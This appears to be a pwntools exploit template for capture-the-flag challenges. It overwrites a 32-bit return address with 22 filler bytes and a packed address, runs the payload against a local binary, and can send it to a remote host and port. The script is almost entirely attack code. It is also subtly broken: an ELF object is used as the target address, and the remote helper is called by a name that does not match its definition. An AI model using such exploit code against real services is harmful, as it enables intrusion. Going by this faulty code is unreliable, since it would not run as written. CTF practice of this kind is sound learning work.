import socket
import argparse
from pwn import *
 
def only_if_external(data):
        parser = argparse.ArgumentParser()
        parser.add_argument("host", type = str, help = "The host to connect to")
        parser.add_argument("port", type = int, help = "The port to connect to")
 
        args = parser.parse_args()
 
        with socket.socket() as connection:
                connection.connect((args.host, args.port))
                print(connection.recv(4096).decode("utf-8"))
                connection.send(data)
                print(connection.recv(4096).decode("utf-8"))
                print(connection.recv(4096).decode("utf-8"))
 
context.bits = 32 #if 32 bit or 64 bit binary
 
addr = pwn.ELF("<binary file name>")  #address of the target function.
 
payload = b"A"*22 + p32(addr) + b"\n" #creating payload. the number of A's is found by using pattern offset. use p64 for 64 bit
 
p = process("./<binary file name>") 
p.send(payload) 
p.interactive() 
 
only_if_nc(payload) #Use this only if the flag is obtained from an remote server. 
